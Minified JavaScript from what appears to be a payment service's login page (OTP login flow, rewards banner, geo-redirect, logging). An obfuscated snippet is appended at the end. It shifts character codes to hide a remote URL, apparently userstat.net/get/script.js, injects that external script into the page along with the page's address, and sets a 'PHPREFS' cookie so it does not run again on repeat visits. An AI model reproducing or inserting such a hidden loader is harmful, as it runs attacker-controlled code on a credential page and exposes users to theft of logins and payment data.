t=!!$("body").data("webAuthnLoginContext"),n=document.querySelector("#beginOtpLogin"),r=$("#tryAnotherWayLinkContainer");!e.phoneAvailable||e.emailAvailable||t?e.phoneAvailable||e.emailAvailable||t?($(n)&&$(n).addClass("hidden"),r.removeClass("hide"),login.utils.logTryAnotherWayInstrumentData({page:"password",action:"linkShown"}),login.logger.pushLogs()):($(n)&&$(n).addClass("hidden"),r.addClass("hide")):($(n)&&$(n).removeClass("hidden"),r.addClass("hide"))}function x(t){function A(n){return login.logger.log({evt:"CHALLENGE_SMS_SUCCESS",data:"CHALLENGE_SMS_SUCCESS",calEvent:!0}),login.logger.log({evt:"state_name",data:"otp_cs_eligibility",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_otp_cs_eligibility",instrument:!0}),h||!u||t.otpLoginEligible&&(c||m)?n&&n.html?($(p)&&$(p).remove(),"autoSendOtp"!==t.integrationType&&"onOnboardingFlow"!==t.integrationType||(e.update({sendSmsChallengePage:n.html}),w(n.html)),E(n.model),login.utils.logTawOptions(),login.logger.log({evt:"source_decisioning",data:"otp_login_via_link_shown",instrument:!0}),login.logger.log({evt:"otp_cs_elg",data:"otp_login_ineligible_html",instrument:!0}),login.logger.pushLogs(),void e.update({sendSmsChallengePage:n.html})):(d(),login.logger.pushLogs(),void login.utils.hideSpinner()):(d(),login.logger.log({evt:"CHALLENGE_SMS_SUCCESS",data:"OTP_LOGIN_INELIGIBLE",calEvent:!0}),login.logger.log({evt:"otp_cs_elg",data:"otp_login_ineligible_sms",instrument:!0}),login.logger.pushLogs(),void login.utils.hideSpinner())}function O(e){var n=$("#tryAnotherWayModal"),r=$(".modal-content");return n.hasClass("hide")||(n.addClass("hide"),n.removeClass("transitioned"),r&&r.removeClass("transitioned")),login.logger.log({evt:"CHALLENGE_SMS_HANDLE_XHR",data:"CHALLENGE_SMS_HANDLE_XHR",calEvent:!0}),login.logger.log({evt:"state_name",data:"otp_cs_eligibility",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_otp_cs_eligibility",instrument:!0}),t.otpLoginEligible||h?e.notifications?(a(e.notifications),i.value=e._csrf,login.logger.log({evt:"CHALLENGE_SMS_HANDLE_XHR",data:"NOTIFICATIONS",calEvent:!0}),login.logger.log({evt:"otp_cs_elg",data:"otp_login_notifications",instrument:!0}),login.logger.pushLogs(),login.utils.hideSpinner(),void login.utils.logTawOptions()):(e.html&&($(p)&&$(p).remove(),login.logger.log({evt:"CHALLENGE_SMS_HANDLE_XHR",data:"HTML",calEvent:!0}),login.logger.log({evt:"otp_cs_elg",data:"otp_login_html",instrument:!0}),w(e.html)),login.utils.logTawOptions(),login.logger.pushLogs(),void login.utils.hideSpinner()):(login.logger.log({evt:"CHALLENGE_SMS_HANDLE_XHR",data:"OTP_LOGIN_INELIGIBLE",calEvent:!0}),login.logger.log({evt:"otp_cs_elg",data:"otp_login_ineligible_handle_xhr",instrument:!0}),login.logger.pushLogs(),login.utils.hideSpinner(),void login.utils.logTawOptions())}for(var r=("onOnboardingFlow"===t.integrationType?document.querySelector(".proceed"):document.querySelector('form[name="login"]')).querySelectorAll("input")||[],i=document.querySelector("#token")||{},s="viaLink"===t.integrationType||"autoSendOtp"===t.integrationType||"secondaryOtp"===t.integrationType||"onOnboardingFlow"===t.integrationType,o={},u=document.querySelector("#login"),f=document.querySelector("#email")||document.querySelector("input[name=login_email]")||{},l=document.querySelector("#phoneCode"),c=document.querySelector("#beginOtpLogin"),h=$("body").data("isOtpSmsUser"),p=document.querySelector('#main section[id="otpLogin"]'),v=$("body").data("pwdShowTryAnotherWay")||document.querySelector('input[name="pwdShowTryAnotherWay"]'),m=$("body").data("showTryAnotherWay")||document.querySelector('input[name="showTryAnotherWay"]'),g=document.querySelector("#login #loginWithOtp"),y=g&&g.parentElement,b=document.querySelector("#login #loginWithEmailOtp"),x=b&&b.parentElement,T=document.querySelector("#login #loginWithWebauthn"),N=T&&T.parentElement,C=!!$("body").data("webAuthnLoginContext"),k=$("#fpLogIn")&&!$("#fpLogIn").hasClass("hide"),L=0;L<r.length;L++)o[r[L].name]=r[L].value;o.login_phone&&l&&(o.phoneCode=l.value),o.otpVariant=t.integrationType,o.otpLoginType=t.otpLoginType,"email"!==t.otpType&&"sms"!==t.otpType||(o.login_email=f.value),o.loginPreference=t.loginPreference,o.otpType=t.otpType,!s&&!t.loginPreference&&login.utils.showSpinner(),$.ajax({url:"/signin/challenge/sms",type:"POST",data:o,success:function(e){var n=(e=e||{}).model||{},r=n.phoneAvailable,i=n.emailAvailable;if(i&&$(x)&&$(x).removeClass("hide"),r&&$(y)&&$(y).removeClass("hide"),C&&!k&&$(N)&&$(N).removeClass("hide"),v&&void 0!==r&&void 0!==i&&S({phoneAvailable:r,emailAvailable:i}),n.loginPreferenceUpdated&&"password_login"===t.loginPreference)return login.utils.hideSpinner(),void login.utils.logTawOptions();s?A(e):O(e)},fail:function(){login.logger.log({evt:"CHALLENGE_SMS_FAILURE",data:"CHALLENGE_SMS_FAILURE",calEvent:!0}),login.logger.log({evt:"state_name",data:"otp_cs_eligibility",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_otp_cs_eligibility",instrument:!0}),login.logger.log({evt:"otp_cs_elg",data:"challenge_sms_failure",instrument:!0}),login.logger.pushLogs(),!s&&login.utils.hideSpinner()}})}function T(e,t,n){var r=n.rewardsType;t.innerHTML=n.rewardsContentKey,e&&e.setAttribute("data-type",n.rewardsType);var i=e.querySelector(".trophyContainer"),s=e.querySelector(".dealsContainer");if("burn"===n.rewardsType&&s&&$(s).hasClass("hide"))$(s).removeClass("hide");else if("earn"===r&&i&&$(i).hasClass("hide")){var o=t.querySelector("a"),u=o&&o.getAttribute("href");u&&(o.onclick=function(){login.logger.log({evt:"state_name",data:"login_offers_display",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_login_message_earn_termsapply",instrument:!0}),window.open(u,"_blank")}),$(i).removeClass("hide")}$(e).removeClass("hide")}function _(t){var n="safari"===$("body").data("loginExperience"),r=t.isOtpSmsUser,i=login.utils.isFieldPrefilled(document.querySelector("#password")),s=n&&i,o=$("body").data("otpVariant");if("secondaryOtp"===o){var u=document.querySelector('#main section[id="login"] .rewardsBar');login.utils.attachCloseRewardsBarHandler(u)}if("leadOnPublicCredential"===o&&Object.keys(t).length>0&&!t.otpInterstitialHtml&&(login.logger.log({evt:"OTP_LOGIN",data:"OTP_INTERSTITIAL_HTML_UNAVAILABLE",calEvent:!0}),login.logger.pushLogs(),login.utils.hideSpinner()),t.otpInterstitialHtml&&(!login.utils.isSiAppleActivationProcessing()&&!s||r)&&(e.update({sendSmsChallengePage:t.otpInterstitialHtml}),login.otp.hideOnboardingModal||(o="autoSendOtp",w(t.otpInterstitialHtml)),r?login.utils.hideSpinner():E(t),login.utils.logTawOptions()),t.otpInterstitialHtml&&s&&!r){var a=$("#beginOtpLogin");a&&a.hasClass("hidden")&&a.removeClass("hidden"),login.logger.log({evt:"autofilled_credentials",data:"Y",instrument:!0}),login.logger.pushLogs(),o="secondaryOtp",setTimeout(x.bind(null,{integrationType:o,otpLoginEligible:!0}),50)}}function D(){var t=$("#beginOtpLogin"),n=$("#tryAnotherWayLinkContainer");t&&n&&(t&&t.hasClass("otpLoginViaLink")&&!t.hasClass("notVisible")&&t.addClass("notVisible"),t&&t.hasClass("otpLoginViaButton")&&!t.hasClass("hidden")&&t.addClass("hidden"),n&&!n.hasClass("hide")&&n.addClass("hide"),e.clear("sendSmsChallengePage"))}var s,o,e=login.utils.createCache(),t=$("body").data("otpVariant"),n=document.querySelector("#email"),r=document.querySelector("#password");return{prepareSendPage:function(e){e=e||{},function N(){var e=login.utils.getIntent(),t=document.querySelector("#token")||document.querySelector('input[name="_csrf"]'),n=t&&t.value,r=document.querySelector('input[name="isRewardsTreatmentEligible"]'),i=document.querySelector('input[name="rewardsKey"]'),s=i&&i.value;if("true"===(r&&r.value)&&"checkout"===e){var u={_csrf:n,intent:e,rewardsKey:s};$.ajax({url:"/signin/offers/rewards-banner",type:"POST",data:u,success:function(e){if(void 0!==(e=e||{}).displayRewards&&(login.logger.log({evt:"state_name",data:"login_offers_display",instrument:!0}),login.logger.log({evt:"transition_name",data:"request_rewards_eligibility_"+e.rewardsType,instrument:!0}),login.logger.log({evt:"event_name",data:"identity_request_xobuyernodeserv",instrument:!0}),login.logger.pushLogs()),e.displayRewards){var t=document.querySelector('#main section[id="login"]'),n=document.querySelector('#main section[id="otpLogin"]'),r=document.querySelector('#main section[id="verifyOtp"]'),i=document.querySelector('#main section[id="otpLogin"] .rewardsBar'),s=document.querySelector('#main section[id="verifyOtp"] .rewardsBar'),o=document.querySelector('#main section[id="login"] .rewardsBar'),u=document.querySelector(".rewardsBarMobile"),a=document.querySelector('#main section[id="otpLogin"] .rewardsBar .rewardsMessage'),f=document.querySelector('#main section[id="verifyOtp"] .rewardsBar .rewardsMessage'),l=document.querySelector('#main section[id="login"] .rewardsBar .rewardsMessage'),c=document.querySelector(".rewardsMessageMobile");i&&a&&$(i).hasClass("hide")&&T(i,a,e),s&&f&&$(s).hasClass("hide")&&T(s,f,e),o&&l&&$(o).hasClass("hide")&&T(o,l,e),u&&c&&$(u).hasClass("hide")&&T(u,c,e),(t&&!$(t).hasClass("hide")||n&&!$(n).hasClass("hide")||r&&!$(r).hasClass("hide"))&&(login.logger.log({evt:"state_name",data:"login_offers_display",instrument:!0}),login.logger.log({evt:"transition_name",data:"display_login_message_"+e.rewardsType,instrument:!0}),e.displayType&&login.logger.log({evt:"reward",data:e.displayType,instrument:!0}),login.logger.pushLogs())}},fail:function(){login.logger.log({evt:"OFFERS_"+response.rewardsType+"_FAILURE",data:"OFFERS_"+response.rewardsType+"_FAILURE",calEvent:!0}),login.logger.pushLogs()}})}}(),function k(e){var t=document.querySelector(".startOtpLogin");addEvent(t,"click",(function(t){eventPreventDefault(t),login.logger.log({evt:"state_name",data:"begin_pwd",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_otp_link",instrument:!0}),login.logger.pushLogs(),x({integrationType:"onPasswordFailure",otpLoginEligible:$("body").data("otpLoginEligible")||e.otpLoginEligible})}))}(e),function L(e){"onOnboardingFlow"===e.integrationType&&x({integrationType:e.integrationType,otpLoginEligible:$("body").data("otpLoginEligible")||e.otpLoginEligible})}(e),function A(e){"onTryAnotherWayModal"===e.integrationType&&x({integrationType:e.integrationType,otpLoginEligible:$("body").data("otpLoginEligible")||e.otpLoginEligible,otpType:e.otpType})}(e),function C(e){var t=$("body").data("userDeviceTokenLogin"),r=(window.PAYPAL.ulData||{}).aPayAuth,i=$("body").data("oneTouchUser");return login.logger.log({evt:"HANDLE_AUTO_SEND",data:"HANDLE_AUTO_SEND",calEvent:!0}),"autoSendOtp"===e.otpVariant&&x({integrationType:e.otpVariant,otpLoginEligible:e.otpLoginEligible,otpLoginType:$("body").data("otpLoginType")}),"autoSendOtp"!==$("body").data("otpVariant")||"email"===e.otpType||"sms"===e.otpType?(login.logger.log({evt:"HANDLE_AUTO_SEND",data:"NOT_AUTO_OTP",calEvent:!0}),void login.logger.pushLogs()):"autoSendOtp"===$("body").data("otpVariant")&&(r||t||i)?(login.logger.log({evt:"HANDLE_AUTO_SEND",data:r||t||i?"PASSWORDLESS_LOGIN":"",calEvent:!0}),void login.logger.pushLogs()):(login.logger.pushLogs(),void x({integrationType:$("body").data("otpVariant"),otpLoginEligible:$("body").data("otpLoginEligible"),otpLoginType:$("body").data("otpLoginType")}))}(e),function M(e){var n=$("#beginOtpLogin");if(e){var r=document.querySelector('#main section[id="login"] .rewardsBar');login.utils.attachCloseRewardsBarHandler(r),!e.otpLoginOnPwdPageEnabled&&n&&n.hasClass("otpLoginViaLink")&&!n.hasClass("notVisible")&&n.addClass("notVisible"),!e.otpLoginOnPwdPageEnabled&&n&&n.hasClass("otpLoginViaButton")&&!n.hasClass("hidden")&&!login.otp.hideOnboardingModal&&n.addClass("hidden"),!Object.keys(e).length&&$("body").data("otpLoginOnPwdPageEnabled")&&"autoSendOtp"!==$("body").data("otpVariant")&&(t=$("body").data("otpVariant")?$("body").data("otpVariant"):"viaLink",setTimeout(x.bind(null,{integrationType:t,otpLoginEligible:$("body").data("otpLoginEligible")}),50)),e.otpLoginOnPwdPageEnabled&&"autoSendOtp"!==e.otpVariant&&(t=e.otpVariant?e.otpVariant:"viaLink",setTimeout(x.bind(null,{integrationType:t,otpLoginEligible:e.otpLoginEligible}),500))}}(e),_(e),login.pubsub.subscribe("CLEAR_OTP_LOGIN_CONTEXT",D)},attachSendPageEvents:b,enableEmailPasswordField:d,loadChallengePage:x,showOnPwdPage:E,getVerifyPageRenderEndTime:function(){return o}}}(),login.geoEnablement=function(){function n(){}var e="GEO_ENABLEMENT",t=login.logger;return n.setGeoMessage=function(r){r=r||{};var i=$("body").data("geoRedirectUrl")||r.geoRedirectUrl,s=$("body").data("isGeoAutoRedirectEnabled")||r.isGeoAutoRedirectEnabled,o=document.querySelector("p.notification > a.geoRedirectUrl");o&&i&&(o.addEventListener("click",(function(){return t.log({evt:e,data:"USER_CLICKED_GEO_REDIRECT_LINK",calEvent:!0}),t.log({evt:"actionType",data:"geo_redirect_link",instrument:!0}),t.pushLogs(),window.location.href=i})),s&&(t.log({evt:e,data:"TRIGGERED_AUTO_REDIRECTION",calEvent:!0}),t.log({evt:"actionType",data:"geo_auto_redirection",instrument:!0}),t.pushLogs(),window.location.assign(i)))},n}(),login.bootstrap=function(){login.fn.initialize(),login.checkoutIncontext&&login.checkoutIncontext();var e=$("body").data("autoTriggerLoginPriority"),t=login[e];return t?t((function(){return loadFeatures()})):loadFeatures()},window.addEventListener("error",(function(e){if(!e||!e.error)return login.logger.log({evt:"CLIENT_JS_CONSOLE_ERROR",data:"client_is_error_triggered",calEvent:!0}),void login.logger.pushLogs();login.logger.log({evt:"CLIENT_JS_CONSOLE_ERROR",data:JSON.stringify({message:e.error.message,stack:e.error.stack}),calEvent:!0}),login.logger.log({evt:"ext_error_desc",data:e.error.message,instrument:!0}),login.logger.pushLogs()})),document.onreadystatechange=function(){var e,t=login.utils.getSplitLoginContext(),n=login.utils.getIntent(),r=$("body").data("cookieBannerEnabled"),i=$("body").data("oneTouchUser"),s=document.querySelector('input[name="setBuyer"]'),o=$("body").data("loadStartTime"),u=$("body").data("isCookiedUser");if("complete"===document.readyState){var a=login.utils.getNavigationTime();login.logger.log({evt:"transition_name",data:"cpl_prepare_login_ul",instrument:!0}),login.utils.logCPLData({startTime:o,status:"success",flowName:u?"Hybrid Login Cookied":"Hybrid Login Uncookied",t12:a}),login.utils.pubCredPageRenderEndTime=window.performance.timeOrigin+a,login.bootstrap(),login.utils.beaverLogger({transition_name:"first_page_load",status:"success",state:"end"}),(e=window.PAYPAL&&window.PAYPAL.ulData||{}).preloadScriptUrl&&function asyncLoadAssetUrls(e){$("body").data("enableLogPreloadAssetsDownloadData")&&addEvent(window,"beforeunload",logPreloadAssetsDownloadData);for(var r,i,n=e.split(","),s=["js","css"],o=0;o<n.length;o++)if(i=(r=n[o]).split("."),r&&"https://"===r.slice(0,8)&&s.includes(i[i.length-1]))try{var u=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP");addEvent(u,"load",(function(){PAYPAL.ulData.preloadScriptDownloadLength++})),u.open("GET",n[o]),u.send()}catch(a){}}(e.preloadScriptUrl),t?instrumentSplitLoginPageLoad(t):("checkout"===n&&instrumentUlAsLandingPageLoad(),"prox"===n&&function instrumentProx(){var t,e=document.querySelector(".cancelUrl");login.utils.isPpFrameMiniBrowser()?(login.utils.postPpBridgeMessage({flowtype:"prox",status:"loading",viewname:"login"}),login.utils.postPpBridgeMessage({flowtype:"prox",status:"complete",viewname:"login"}),login.utils.postPpBridgeMessage({operation:"init",cancelUrl:$("body").data("returnUrl")||"",landingUrl:window.location.href,secureWindowMsg:$("body").data("secureWindowMsg")||"",processingMsg:$("body").data("processingMsg")||""}),addEvent(window,"beforeunload",(function(e){var t=getEventTarget(e);"BODY"===(t&&t.activeElement&&t.activeElement.nodeName)&&login.utils.postPpBridgeMessage({flowtype:"prox",status:"exit",viewname:"login",exit_type:"user_cancelled"})})),$(e).remove()):(t=login.utils.getOutboundLinksHandler(e,"login_ul","process_cancel_and_return_to_merchant"),login.pubsub.subscribe("WINDOW_CLICK",(function(e){var n=getEventTarget(e);n&&$(n).hasClass("cancelLink")&&t.call(null,e)}))),login.logger.log({evt:"state_name",data:"login_ul",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_ul",instrument:!0}),login.logger.pushLogs()}()),addEvent(document,"click",login.utils.documentClickHandler),login.pubsub.subscribe("WINDOW_CLICK",login.utils.toggleRememberInfoTooltip),login.pubsub.subscribe("WINDOW_CLICK",(function(e){var t=getEventTarget(e),n=$(t).data("clientLogActionType");n&&(login.logger.log({evt:"actiontype",data:n,instrument:!0}),login.logger.pushLogs())})),function showReturnToMerchantLink(){var e=document.querySelector("#returnToMerchant"),t=document.querySelector(".contentContainer");e&&!window.opener&&($(e).removeClass("hide"),t&&$(t).addClass("contentContainerShort"))}(),"lookup"===e.fingerprintProceed&&fingerprint&&fingerprint.lookup(),"login"===e.fingerprintProceed&&fingerprint&&fingerprint.login(),r&&!i&&login.loadResources&&login.loadResources.showCookieBanner(),login.utils.isAppDownloadBannerSupported()&&login.loadResources&&login.loadResources.showAppDownloadBanner(),login.loadResources&&login.loadResources.lazyload(),s&&setTimeout((function(){login.utils.isFnDataLoaded()&&login.xoPlanning.triggerSetBuyerCall(s.value)}),300)}}}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));